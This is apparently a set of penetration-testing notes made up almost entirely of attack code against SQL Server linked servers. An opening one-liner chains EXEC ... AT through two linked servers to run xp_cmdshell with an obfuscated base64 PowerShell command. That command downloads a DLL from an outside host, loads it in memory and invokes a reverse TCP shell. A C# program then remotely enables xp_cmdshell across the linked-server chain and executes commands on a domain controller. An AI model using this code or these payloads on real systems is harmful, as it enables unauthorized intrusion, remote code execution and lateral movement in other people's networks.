EXEC ( ' EXEC (''xp_cmdshell ''''powershell -enc JABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcAMAAvAEkAbgB2AG8AawBlAC0AZABsAGwALgBkAGwAbAAnACkAOwAkAGEAcwBzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGQAYQB0AGEAKQA7ACQAYwBsAGEAcwBzACAAPQAgACQAYQBzAHMALgBHAGUAdABUAHkAcABlACgAJwBJAG4AdgBvAGsAZQBfAGQAbABsAC4AUgBlAHYAZQByAHMAZQBfAHQAYwBwACcAKQA7ACQAbQBlAHQAaABvAGQAIAA9ACAAJABjAGwAYQBzAHMALgBHAGUAdABNAGUAdABoAG8AZAAoACcAcgB1AG4AbgBlAHIAJwApADsAJABtAGUAdABoAG8AZAAuAEkAbgB2AG8AawBlACgAMAAsACQAbgB1AGwAbAApAA=='''' '') AT "dc01.corp2.com" ') AT "rdc01.corp1.com"
```

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;

namespace sql_link
{
    class Program
    {
        static void Main(string[] args)
        {
            // Setup connection to cdc01.prod.corp1.com
            String sqlServer = "cdc01.prod.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String execCmd = "select myuser from openquery(\"rdc01.corp1.com\", 'select myuser from openquery(\"dc01.corp2.com\",''select SYSTEM_USER as myuser'')');";

            String enableadvoptions = "EXEC ( ' EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT \"dc01.corp2.com\" ') AT \"rdc01.corp1.com\" ";

            String enablexpcmdshell = "EXEC ( ' EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT \"dc01.corp2.com\" ') AT \"rdc01.corp1.com\" ";

            String execmd = "EXEC ( ' EXEC (''xp_cmdshell ''''whoami >> C:\\Windows\\Tasks\\whoami.txt'''' '') AT \"dc01.corp2.com\" ') AT \"rdc01.corp1.com\" ";

            SqlCommand command = new SqlCommand(execCmd, con);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read())
            {
                Console.WriteLine("DC01 Login: " + reader[0]);
            }
            reader.Close();


            command = new SqlCommand(enableadvoptions, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enablexpcmdshell, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execmd, con);
            reader = command.ExecuteReader();
            Console.WriteLine("Result is " + reader[0]);
            reader.Close();

            con.Close();
        }
    }
}
```









 





